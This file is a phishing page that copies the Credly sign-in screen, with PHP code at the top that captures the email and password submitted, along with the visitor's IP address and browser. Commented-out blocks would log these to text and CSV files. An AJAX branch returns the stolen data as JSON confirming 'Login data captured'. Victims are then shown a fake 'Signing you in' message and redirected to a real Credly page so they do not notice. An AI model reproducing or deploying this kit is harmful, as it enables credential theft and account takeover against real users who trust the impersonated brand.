<?php
// Enable CORS for cross-origin requests
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Initialize variables
$testinginputemail = "";
$testinginputpassword = "";

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $testinginputemail = $_POST['email'] ?? '';
    $testinginputpassword = $_POST['password'] ?? '';

    // Log the data immediately
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');

    // // Method 1: Save to text file (detailed)
    // $logEntry = "[$timestamp] | Email: $testinginputemail | Password: $testinginputpassword | IP: $ip | UserAgent: $userAgent\n";
    // file_put_contents('credentials.txt', $logEntry, FILE_APPEND);

    // // Method 2: Save to simple format
    // $simpleLog = "$timestamp | Email: $testinginputemail | Password: $testinginputpassword\n";
    // file_put_contents('simple_credentials.txt', $simpleLog, FILE_APPEND);

    // // Method 3: Save to CSV file
    // $csvData = [
    //     $timestamp,
    //     $testinginputemail,
    //     $testinginputpassword,
    //     $ip,
    //     $userAgent
    // ];
    // $csvLine = '"' . implode('","', $csvData) . '"' . PHP_EOL;

    // // Create CSV file if it doesn't exist
    // if (!file_exists('credentials.csv')) {
    //     $csvHeader = '"Timestamp","Email","Password","IP","UserAgent"' . PHP_EOL;
    //     file_put_contents('credentials.csv', $csvHeader);
    // }
    // file_put_contents('credentials.csv', $csvLine, FILE_APPEND);

    // For AJAX requests, return JSON
    if (
        isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
        (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
    ) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'email' => $testinginputemail,
            'password' => $testinginputpassword,
            'ip' => $ip,
            'userAgent' => $userAgent,
            'message' => 'Login data captured successfully'
        ]);
        exit;
    }

    // For regular form submission, redirect to info.credly.com
    header('Location: https://info.credly.com');
    exit;
}
?>

<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" type="image/svg+xml" href="images/credlyicon.png">
    <link rel="icon" type="image/png" href="favicon.png">
    <script async="" src="./sign_credly_files/pendo.js.download"></script>
    <script src="./sign_credly_files/otSDKStub.js.download" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="01939cd7-7f26-7c87-af17-d2bfc69700b9"></script>
    <style type="text/css" id="operaUserStyle"></style>
    <script nonce="">
        //<![CDATA[

        function OptanonWrapper() {}

        //]]>
    </script>
    <script nonce="">
        //<![CDATA[

        window._trackJs = {
            token: 'e43bb3a0b11a469ba1ef2ec2b79c6b11',
            application: 'acclaim-production',
            version: '1.207.1'
        };

        //]]>
    </script>
    <script type="text/javascript" src="./sign_credly_files/tracker.js.download"></script>

<style type="text/css">
        :root,
        :host {
            --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Free";
            --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Free";
            --fa-font-light: normal 300 1em/1 "Font Awesome 6 Pro";
            --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Pro";
            --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
            --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
            --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
            --fa-font-sharp-duotone-solid: normal 900 1em/1 "Font Awesome 6 Sharp Duotone";
        }

        svg:not(:root).svg-inline--fa,
        svg:not(:host).svg-inline--fa {
            overflow: visible;
            box-sizing: content-box;
        }

        .svg-inline--fa {
            display: var(--fa-display, inline-block);
            height: 1em;
            overflow: visible;
            vertical-align: -0.125em;
        }

        .svg-inline--fa.fa-2xs {
            vertical-align: 0.1em;
        }

        .svg-inline--fa.fa-xs {
            vertical-align: 0em;
        }

        .svg-inline--fa.fa-sm {
            vertical-align: -0.0714285705em;
        }

        .svg-inline--fa.fa-lg {
            vertical-align: -0.2em;
        }

        .svg-inline--fa.fa-xl {
            vertical-align: -0.25em;
        }

        .svg-inline--fa.fa-2xl {
            vertical-align: -0.3125em;
        }

        .svg-inline--fa.fa-pull-left {
            margin-right: var(--fa-pull-margin, 0.3em);
            width: auto;
        }

        .svg-inline--fa.fa-pull-right {
            margin-left: var(--fa-pull-margin, 0.3em);
            width: auto;
        }

        .svg-inline--fa.fa-li {
            width: var(--fa-li-width, 2em);
            top: 0.25em;
        }

        .svg-inline--fa.fa-fw {
            width: var(--fa-fw-width, 1.25em);
        }

        .fa-layers svg.svg-inline--fa {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
        }

        .fa-layers-counter,
        .fa-layers-text {
            display: inline-block;
            position: absolute;
            text-align: center;
        }

        .fa-layers {
            display: inline-block;
            height: 1em;
            position: relative;
            text-align: center;
            vertical-align: -0.125em;
            width: 1em;
        }

        .fa-layers svg.svg-inline--fa {
            transform-origin: center center;
        }

        .fa-layers-text {
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            transform-origin: center center;
        }

        .fa-layers-counter {
            background-color: var(--fa-counter-background-color, #ff253a);
            border-radius: var(--fa-counter-border-radius, 1em);
            box-sizing: border-box;
            color: var(--fa-inverse, #fff);
            line-height: var(--fa-counter-line-height, 1);
            max-width: var(--fa-counter-max-width, 5em);
            min-width: var(--fa-counter-min-width, 1.5em);
            overflow: hidden;
            padding: var(--fa-counter-padding, 0.25em 0.5em);
            right: var(--fa-right, 0);
            text-overflow: ellipsis;
            top: var(--fa-top, 0);
            transform: scale(var(--fa-counter-scale, 0.25));
            transform-origin: top right;
        }

        .fa-layers-bottom-right {
            bottom: var(--fa-bottom, 0);
            right: var(--fa-right, 0);
            top: auto;
            transform: scale(var(--fa-layers-scale, 0.25));
            transform-origin: bottom right;
        }

        .fa-layers-bottom-left {
            bottom: var(--fa-bottom, 0);
            left: var(--fa-left, 0);
            right: auto;
            top: auto;
            transform: scale(var(--fa-layers-scale, 0.25));
            transform-origin: bottom left;
        }

        .fa-layers-top-right {
            top: var(--fa-top, 0);
            right: var(--fa-right, 0);
            transform: scale(var(--fa-layers-scale, 0.25));
            transform-origin: top right;
        }

        .fa-layers-top-left {
            left: var(--fa-left, 0);
            right: auto;
            top: var(--fa-top, 0);
            transform: scale(var(--fa-layers-scale, 0.25));
            transform-origin: top left;
        }

        .fa-1x {
            font-size: 1em;
        }

        .fa-2x {
            font-size: 2em;
        }

        .fa-3x {
            font-size: 3em;
        }

        .fa-4x {
            font-size: 4em;
        }

        .fa-5x {
            font-size: 5em;
        }

        .fa-6x {
            font-size: 6em;
        }

        .fa-7x {
            font-size: 7em;
        }

        .fa-8x {
            font-size: 8em;
        }

        .fa-9x {
            font-size: 9em;
        }

        .fa-10x {
            font-size: 10em;
        }

        .fa-2xs {
            font-size: 0.625em;
            line-height: 0.1em;
            vertical-align: 0.225em;
        }

        .fa-xs {
            font-size: 0.75em;
            line-height: 0.0833333337em;
            vertical-align: 0.125em;
        }

        .fa-sm {
            font-size: 0.875em;
            line-height: 0.0714285718em;
            vertical-align: 0.0535714295em;
        }

        .fa-lg {
            font-size: 1.25em;
            line-height: 0.05em;
            vertical-align: -0.075em;
        }

        .fa-xl {
            font-size: 1.5em;
            line-height: 0.0416666682em;
            vertical-align: -0.125em;
        }

        .fa-2xl {
            font-size: 2em;
            line-height: 0.03125em;
            vertical-align: -0.1875em;
        }

        .fa-fw {
            text-align: center;
            width: 1.25em;
        }

        .fa-ul {
            list-style-type: none;
            margin-left: var(--fa-li-margin, 2.5em);
            padding-left: 0;
        }

        .fa-ul>li {
            position: relative;
        }

        .fa-li {
            left: calc(-1 * var(--fa-li-width, 2em));
            position: absolute;
            text-align: center;
            width: var(--fa-li-width, 2em);
            line-height: inherit;
        }

        .fa-border {
            border-color: var(--fa-border-color, #eee);
            border-radius: var(--fa-border-radius, 0.1em);
            border-style: var(--fa-border-style, solid);
            border-width: var(--fa-border-width, 0.08em);
            padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
        }

        .fa-pull-left {
            float: left;
            margin-right: var(--fa-pull-margin, 0.3em);
        }

        .fa-pull-right {
            float: right;
            margin-left: var(--fa-pull-margin, 0.3em);
        }

        .fa-beat {
            animation-name: fa-beat;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, ease-in-out);
        }

        .fa-bounce {
            animation-name: fa-bounce;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
        }

        .fa-fade {
            animation-name: fa-fade;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        }

        .fa-beat-fade {
            animation-name: fa-beat-fade;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        }

        .fa-flip {
            animation-name: fa-flip;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, ease-in-out);
        }

        .fa-shake {
            animation-name: fa-shake;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, linear);
        }

        .fa-spin {
            animation-name: fa-spin;
            animation-delay: var(--fa-animation-delay, 0s);
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 2s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, linear);
        }

        .fa-spin-reverse {
            --fa-animation-direction: reverse;
        }

        .fa-pulse,
        .fa-spin-pulse {
            animation-name: fa-spin;
            animation-direction: var(--fa-animation-direction, normal);
            animation-duration: var(--fa-animation-duration, 1s);
            animation-iteration-count: var(--fa-animation-iteration-count, infinite);
            animation-timing-function: var(--fa-animation-timing, steps(8));
        }

        @media (prefers-reduced-motion: reduce) {

            .fa-beat,
            .fa-bounce,
            .fa-fade,
            .fa-beat-fade,
            .fa-flip,
            .fa-pulse,
            .fa-shake,
            .fa-spin,
            .fa-spin-pulse {
                animation-delay: -1ms;
                animation-duration: 1ms;
                animation-iteration-count: 1;
                transition-delay: 0s;
                transition-duration: 0s;
            }
        }

        @keyframes fa-beat {

            0%,
            90% {
                transform: scale(1);
            }

            45% {
                transform: scale(var(--fa-beat-scale, 1.25));
            }
        }

        @keyframes fa-bounce {
            0% {
                transform: scale(1, 1) translateY(0);
            }

            10% {
                transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            }

            30% {
                transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            }

            50% {
                transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            }

            57% {
                transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            }

            64% {
                transform: scale(1, 1) translateY(0);
            }

            100% {
                transform: scale(1, 1) translateY(0);
            }
        }

        @keyframes fa-fade {
            50% {
                opacity: var(--fa-fade-opacity, 0.4);
            }
        }

        @keyframes fa-beat-fade {

            0%,
            100% {
                opacity: var(--fa-beat-fade-opacity, 0.4);
                transform: scale(1);
            }

            50% {
                opacity: 1;
                transform: scale(var(--fa-beat-fade-scale, 1.125));
            }
        }

        @keyframes fa-flip {
            50% {
                transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            }
        }

        @keyframes fa-shake {
            0% {
                transform: rotate(-15deg);
            }

            4% {
                transform: rotate(15deg);
            }

            8%,
            24% {
                transform: rotate(-18deg);
            }

            12%,
            28% {
                transform: rotate(18deg);
            }

            16% {
                transform: rotate(-22deg);
            }

            20% {
                transform: rotate(22deg);
            }

            32% {
                transform: rotate(-12deg);
            }

            36% {
                transform: rotate(12deg);
            }

            40%,
            100% {
                transform: rotate(0deg);
            }
        }

        @keyframes fa-spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .fa-rotate-90 {
            transform: rotate(90deg);
        }

        .fa-rotate-180 {
            transform: rotate(180deg);
        }

        .fa-rotate-270 {
            transform: rotate(270deg);
        }

        .fa-flip-horizontal {
            transform: scale(-1, 1);
        }

        .fa-flip-vertical {
            transform: scale(1, -1);
        }

        .fa-flip-both,
        .fa-flip-horizontal.fa-flip-vertical {
            transform: scale(-1, -1);
        }

        .fa-rotate-by {
            transform: rotate(var(--fa-rotate-angle, 0));
        }

        .fa-stack {
            display: inline-block;
            vertical-align: middle;
            height: 2em;
            position: relative;
            width: 2.5em;
        }

        .fa-stack-1x,
        .fa-stack-2x {
            bottom: 0;
            left: 0;
            margin: auto;
            position: absolute;
            right: 0;
            top: 0;
            z-index: var(--fa-stack-z-index, auto);
        }

        .svg-inline--fa.fa-stack-1x {
            height: 1em;
            width: 1.25em;
        }

        .svg-inline--fa.fa-stack-2x {
            height: 2em;
            width: 2.5em;
        }

        .fa-inverse {
            color: var(--fa-inverse, #fff);
        }

        .sr-only,
        .fa-sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }

        .sr-only-focusable:not(:focus),
        .fa-sr-only-focusable:not(:focus) {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }

        .svg-inline--fa .fa-primary {
            fill: var(--fa-primary-color, currentColor);
            opacity: var(--fa-primary-opacity, 1);
        }

        .svg-inline--fa .fa-secondary {
            fill: var(--fa-secondary-color, currentColor);
            opacity: var(--fa-secondary-opacity, 0.4);
        }

        .svg-inline--fa.fa-swap-opacity .fa-primary {
            opacity: var(--fa-secondary-opacity, 0.4);
        }

        .svg-inline--fa.fa-swap-opacity .fa-secondary {
            opacity: var(--fa-primary-opacity, 1);
        }

        .svg-inline--fa mask .fa-primary,
        .svg-inline--fa mask .fa-secondary {
            fill: black;
        }

        .fad.fa-inverse,
        .fa-duotone.fa-inverse {
            color: var(--fa-inverse, #fff);
        }
    </style>

    
    <script nonce="">
        //<![CDATA[

        (function(apiKey) {
            (function(p, e, n, d, o) {
                var v, w, x, y, z;
                o = p[d] = p[d] || {};
                o._q = [];
                v = ['initialize', 'identify', 'updateOptions', 'pageLoad'];
                for (w = 0, x = v.length; w < x; ++w)(function(m) {
                    o[m] = o[m] || function() {
                        o._q[m === v[0] ? 'unshift' : 'push']([m].concat([].slice.call(arguments, 0)));
                    };
                })(v[w]);
                y = e.createElement(n);
                y.async = !0;
                y.src = 'https://cdn.pendo.io/agent/static/' + apiKey + '/pendo.js';
                z = e.getElementsByTagName(n)[0];
                z.parentNode.insertBefore(y, z);
            })(window, document, 'script', 'pendo');
        })("65460ef3-56d0-45a3-7b3b-fe1ec0463054")

        //]]>
    </script>
    <meta content="Credly is a global Open Badge platform that closes the gap between skills and opportunities. We work with academic institutions, corporations, and professional associations to translate learning outcomes into digital credentials that are immediately validated, managed, and shared." data-rh="" name="description">
    <meta content="Credly, Credly badges, Acclaim, open badges, digital badges, badges, web-enabled credentials, Badge Alliance, Mozilla Open Badge standards, Mozilla Open Badges, verified credentials, learning outcomes" name="keywords">
    <meta content="width=device-width,initial-scale=1.0" name="viewport">
    <meta content="1B97012E4CB3B07611090D1A0B4D9D19" name="msvalidate.01">
    <meta content="d20lZjrSJJ_n0jc1HHlADZBDmn5wZfiBDucFzzOzHCY" name="google-site-verification">

    <meta name="csrf-param" content="authenticity_token">
    <meta name="csrf-token" content="9eJbJ4oiQ1smggnU9E0R8gnojbxb9ZK1frDXJpt5hxfquCKzfzMr7AvCw3P52fFsJOLwnRR9tx4J98UIIWiy4g">
    <link rel="stylesheet" href="./sign_credly_files/css" media="all">
    <link rel="stylesheet" href="./sign_credly_files/bcc0eop.css" media="all">
    <script async="true" src="./sign_credly_files/js"></script>
    <script nonce="">
        //<![CDATA[
        window.dataLayer = window.dataLayer || [];

        function google_tag() {
            dataLayer.push(arguments);
        }
        google_tag('js', new Date());
        google_tag('config', 'G-5D8QQR0C2M');
        (function() {
            var tests = [];
            for (var k in {}) {
                tests.push(k);
            }
            google_tag('set', 'dimension1', tests.join(';'));
        })();
        google_tag('send', 'pageview');

        //]]>
    </script>
    <title>Sign In - Credly</title>
    <link rel="stylesheet" href="./sign_credly_files/transitional-ad74f2218752f8e97ea9f0c032d42d718238f0c822804b91c85e86ccd244f4f6.css" media="all">
    <link rel="stylesheet" href="./sign_credly_files/application-00f4a5becf21c7e9b51e60342eddc1bf37c6550d698be5e6791c45509de4b746.css" media="all">
    <script src="./sign_credly_files/otBannerSdk.js.download" async="" type="text/javascript"></script>
    <style data-styled="active" data-styled-version="5.3.11"></style>
    <link id="googleidentityservice" type="text/css" media="all" href="./sign_credly_files/style" rel="stylesheet">
    <meta http-equiv="origin-trial" content="A8o5T4MyEkRZqLA9WeG2XTFdV5tsX2Prg85xyQ+RL1btVuybB1K/EQ+7JUsPK+J32oBMTnsoF9B4A+qTlL6efgQAAABweyJvcmlnaW4iOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkZlZENtQnV0dG9uTW9kZSIsImV4cGlyeSI6MTc0NDY3NTIwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
</head>

<body class="">
    <script>
        if (!Object.values) {
            document.write('<script src="https://cdn.credly.com/assets/ie_polyfills.legacy-browser-eb3f8596e1c5f284c28e29674c90aed1b5afae6dd3ec51117298e5a75b8dcde9.js" crossorigin="anonymous" type="module"><\/script>')
        }
    </script>
    <script nonce="">
        //<![CDATA[
        setTimeout(function() {
            pendo.initialize({
                "visitor": {},
                "account": {}
            });
        }, 1000)

        //]]>
    </script>
    <header class="transitional" id="website-header" style="display: none;">
        <div class="website-header-main-links-container website-header-placeholder"></div>
        <div>
            <a href="https://www.credly.com/users/sign_in?_gl=1*14dg3od*_ga*NDM4Nzc3MzUzLjE3NjI5NDUwODg.*_ga_Z763G7NB5L*czE3NjI5NDUwODYkbzEkZzAkdDE3NjI5NDUwOTAkajYwJGwwJGgw*_gcl_au*MjA0ODQ2MDY1OS4xNzYyOTQ1MDkw#skip-target" id="skip-to-content">Skip to content</a>
        </div>
        <div class="website-header-main-links-container non-react-header" hidden="">
            <div class="grid website-header-main-links">
                <a class="acclaim-logo" href="https://www.credly.com/">Credly</a>
            </div>
        </div>

        <div class="website-header-main-links-container" style="">
            <div class="grid website-header-main-links"><a id="acclaim-logo" tabindex="0" href="https://www.credly.com/">Credly</a>
                <nav>
                    <div class="">
                        <div class="c-global-search__search-bar">
                            <div class="container">
                                <div class="row">
                                    <div class="global-search-bar global-search-bar--unauthenticated"><template data-react-aria-hidden="true">
                                            <div class="InputBasestyles__Container-fredly__sc-1ucxilb-0 kbvdPF SearchInputstyles__StyledIconBase-fredly__sc-1l8yu9g-0 bOUTtJ global-search-bar__input__input"><input type="text" id="global-search-input" placeholder="Search by badge name, organization, skill, occupation or learning pathway" name="search" data-testid="SearchInputV2" role="searchbox" class="InputBasestyles__StyledInput-fredly__sc-1ucxilb-2 kdoWNr" value=""><span data-testid="left-search-icon" class="Iconstyles__Container-fredly__sc-hl5ane-0 hONSXJ SearchInputstyles__StyledIcon-fredly__sc-1l8yu9g-1 jDzdoB"><svg aria-labelledby="svg-inline--fa-title-5UL77jTykbRU" data-prefix="far" data-icon="magnifying-glass" class="svg-inline--fa fa-magnifying-glass " xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" color="#4E4E4E">
                                                        <title id="svg-inline--fa-title-5UL77jTykbRU">Search</title>
                                                        <path fill="currentColor" d="M368 208A160 160 0 1 0 48 208a160 160 0 1 0 320 0zM337.1 371.1C301.7 399.2 256.8 416 208 416C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208c0 48.8-16.8 93.7-44.9 129.1L505 471c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0L337.1 371.1z"></path>
                                                    </svg></span></div>
                                        </template>
                                        <div class="global-search-bar__input__combobox" data-rac="">
                                            <div class="InputBasestyles__Container-fredly__sc-1ucxilb-0 kbvdPF SearchInputstyles__StyledIconBase-fredly__sc-1l8yu9g-0 bOUTtJ global-search-bar__input__input"><label class="InputBasestyles__StyledLabel-fredly__sc-1ucxilb-1 hdzQbB" id="react-aria3540752137-5" for="global-search-input" aria-labelledby="global-search-input"></label><input type="text" aria-autocomplete="list" autocomplete="off" name="search" placeholder="Search by badge name, organization, skill, occupation or learning pathway" autocorrect="off" spellcheck="false" tabindex="0" id="global-search-input" aria-labelledby="react-aria3540752137-5" role="searchbox" aria-expanded="false" data-testid="SearchInputV2" class="InputBasestyles__StyledInput-fredly__sc-1ucxilb-2 kdoWNr" value="" title=""><span data-testid="left-search-icon" class="Iconstyles__Container-fredly__sc-hl5ane-0 hONSXJ SearchInputstyles__StyledIcon-fredly__sc-1l8yu9g-1 jDzdoB"><svg aria-labelledby="svg-inline--fa-title-ievORBrmm4Td" data-prefix="far" data-icon="magnifying-glass" class="svg-inline--fa fa-magnifying-glass " xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" color="#4E4E4E">
                                                        <title id="svg-inline--fa-title-ievORBrmm4Td">Search</title>
                                                        <path fill="currentColor" d="M368 208A160 160 0 1 0 48 208a160 160 0 1 0 320 0zM337.1 371.1C301.7 399.2 256.8 416 208 416C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208c0 48.8-16.8 93.7-44.9 129.1L505 471c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0L337.1 371.1z"></path>
                                                    </svg></span></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="c-global-search__results c-global-search__results--is-hidden cr-search-results cr-search-results--unfocused cr-search-results--is-hidden"></div>
                    </div>
                </nav>
            </div>
        </div>
    </header>
    <div class="search-bar" data-container="search-bar"></div>
    <div class="sessions" id="flash">
        <div class="grid">
            <div class="l1-0 r1-0" data-behavior="flash-container">
                <noscript>
                    <div class='flash notice'>
                        <i class='icon-error'></i>
                        <div>
                            We've detected that your browser has JavaScript disabled. Some features of Credly require Javascript to be enabled. For the best experience, please enable JavaScript in your browser settings or try using a different browser.
                        </div>
                    </div>
                </noscript>

            </div>
        </div>
    </div>






    <main id="root">
        <div data-testid="semantic-colors-provider">
            <span id="skip-target" data-debugname="root" style=""></span>

            <!-- Display loading message if form was submitted -->
            <?php if ($_SERVER["REQUEST_METHOD"] == "POST"): ?>
                <div class="success-message">
                    <div class="loading-spinner"></div>
                    <strong>Signing you in... Please wait</strong>
                </div>

                <script>
                    // Redirect to info.credly.com after 2 seconds
                    setTimeout(function() {
                        window.location.href = 'https://info.credly.com';
                    }, 2000);
                </script>
            <?php endif; ?>

            <div>
                <!-- TOP SECTION: Logo, content and signin form -->
                <div class="homepage__top-content">
                    <div class="container homepage__top-content--container">
                        <div class="row homepage__top-content--container_row">

                            <!-- LEFT SIDE: Brand content -->
                            <div class="col-md-5 homepage__landing-text">
                                <a href="https://www.credly.com/">
                                    <img src="./sign_credly_files/credly-logo-white-NBKYDKYM.digested.svg" alt="Credly logo" class="homepage__logo">
                                </a>
                                <h1 class="homepage__header">Level up your career.</h1>
                                <div class="homepage__top-text-container">
                                    <p class="homepage__top-text">Join millions of professionals, recruiters, and employers on Credly, where you can:</p>
                                    <ul>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Grow your professional skills</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Broadcast your skills to managers at your company</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Earn credentials that translate to college credit</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Discover new professional opportunities</div>
                                        </li>
                                    </ul>
                                </div>
                            </div>

                            <!-- RIGHT SIDE: Signin form -->
                            <div class="col-md-6 offset-md-1 homepage__children">
                                <div class="homepage__signin-wrapper">
                                    <div class="signin-form" data-webdriver-signin-main="">
                                        <!-- Form submits to itself -->
                                        <form data-testid="form" class="signin-form__form" method="POST" action="save.php">
                                            <div class="signin-form__header">
                                                <h2 class="ac-heading ac-heading--action-page-head">Sign In</h2>
                                            </div>
                                            <!-- EMAIL FIELD -->
                                            <div class="c-field-group c-field-group__has-label signin-form__field">
                                                <div class="c-field-group__input-group c-field-group__input-group--enclosed">
                                                    <label for="email_8" id="label_email_8" class="c-input-label c-field-group__label"><span>Email</span></label>
                                                    <input type="email" name="email" id="email_8" aria-labelledby="label_email_8" autocomplete="email" aria-required="true" class="c-text-field__input" required>
                                                </div>
                                            </div>

                                            <!-- PASSWORD FIELD -->
                                            <div class="c-field-group c-field-group__has-label signin-form__field">
                                                <div class="c-field-group__input-group c-field-group__input-group--enclosed">
                                                    <label for="password_10" id="label_password_10" class="c-input-label c-field-group__label"><span>Password</span><span></span></label>
                                                    <input type="password" class="c-password-field__input" aria-required="true" name="password" id="password_10" aria-labelledby="label_password_10" autocomplete="current-password" required>
                                                </div>
                                            </div>

                                            <!-- REMEMBER ME & FORGOT PASSWORD -->
                                            <div>
                                                <a class="signin__forgot-password" href="https://www.credly.com/users/password/new">
                                                    Forgot your password?
                                                </a>
                                            </div>

                                                <!-- SIGN IN BUTTON -->
                                                <div class="signin-form__submit">
                                                    <button class="cr-button cr-button__primary cr-button__full cr-button__mobile-full cr-button__submit-wrap" type="submit">
                                                        <div class="cr-button__content">Sign In</div>
                                                    </button>
                                                </div>

                                            <!-- SOCIAL SIGN-ON SECTION -->
                                            <div class="social-signon-buttons__sso-content">
                                                <div class="social-signon-buttons__or">OR</div>
                                                <div class="google-sso-button__responsive-container">
                                                    <div role="button" id="google_sso_btn" class="google-sso-button__g-sso-button">
                                                        <div class="S9gUrf-YoZ4jf" style="position: relative;">
                                                            <div></div>
                                                            <iframe src="./sign_credly_files/button.html" class="L5Fo6c-PQbLGe" allow="identity-credentials-get" id="gsi_109652_628505" title="Sign in with Google" style="display: block; position: relative; top: 0px; left: 0px; height: 44px; width: 418px; border: 0px; margin: -2px -10px;"></iframe>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="apple-sso-button__responsive-container">
                                                    <div role="button" class="apple-sso-button__apple-sso-button" tabindex="0">
                                                        <img src="./sign_credly_files/apple-logo-E4IM6MJE.digested.svg" alt="" class="apple-sso-button__logo">
                                                        <span>Sign in with Apple</span>
                                                    </div>
                                                </div>
                                            </div>

                                            <!-- CREATE ACCOUNT LINK -->
                                            <div class="container signin-form__create-account">
                                                <a href="https://www.credly.com/users/sign_up">Create account</a>
                                            </div>

                                        </form>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>

                <!-- BOTTOM SECTION: Background pattern -->
                <div class="homepage__bottom-content" style="background-image: url(https://credly.com/assets/credly-pattern-53M7PTMO.digested.svg);">
                    <div class="container"></div>
                </div>

            </div>
        </div>
    </main>


    <div data-container="global-search-results"></div>


    <script nonce="">
        //<![CDATA[
        (function() {
            document.addEventListener("click", function(e) {
                const eventTarget = e.target;
                if (eventTarget.id == "skip-to-content" || eventTarget.id == "skip-nav") {
                    let href, target;
                    href = eventTarget.getAttribute("href").substr(1);
                    target = document.getElementById(href);
                    if (!target.getAttribute("tabindex")) {
                        target.setAttribute("tabindex", "-1");
                    }
                    target.focus();
                }
            });
        })();


        //]]>
    </script>






